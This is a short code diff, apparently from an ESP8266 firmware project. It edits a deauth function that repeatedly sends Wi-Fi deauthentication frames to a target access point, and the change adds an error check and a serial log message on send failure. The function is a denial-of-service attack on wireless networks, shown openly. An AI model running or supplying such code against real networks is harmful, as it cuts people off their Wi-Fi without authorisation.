@@ -27,7 +27,9 @@ void deauth(AccessPoint ap){
   for(int i =0; i< 100; i++){
       wifi_set_channel(ap.channel);
       delay(1);
-      wifi_send_pkt_freedom(ap.deauthPacket, 26, 0);
+      if(wifi_send_pkt_freedom(ap.deauthPacket, 26, 0) != 0){
+        Serial.println("Error sending deauth packet");
+      }
       delay(1);
   }
 }
